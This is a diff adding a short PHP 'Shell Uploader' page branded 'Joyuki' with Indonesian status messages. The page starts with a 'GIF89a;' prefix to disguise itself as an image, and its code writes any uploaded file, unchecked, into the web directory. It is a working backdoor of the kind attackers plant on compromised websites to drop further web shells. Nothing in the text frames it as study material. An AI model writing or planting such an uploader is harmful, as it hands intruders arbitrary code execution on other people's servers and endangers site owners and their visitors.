@@ -1,0 +1,23 @@
+<html>
+<title>Shell Uploader</title>
+<style>
+body {
+    background-repeat: no-repeat;
+    background-size: 100% 100%;
+	text-shadow: 1px 1px 4px #000000;
+}
+</style>
+<center>
+<br>
+<font color="red" face="courier"><h1>Joyuki She</font><font color="white" face="courier">ll Uploader</h1></font><br><br><br><br>
+GIF89a;
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="500"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><font color="green">Berhasil Di Upload Coeg!!!</font><b><br><br>'; }
+else { echo '<b><font color="red">Gagal Di Upload :( !!!</font></b><br><br>'; }
+}
+?>
+</center>
+</html>
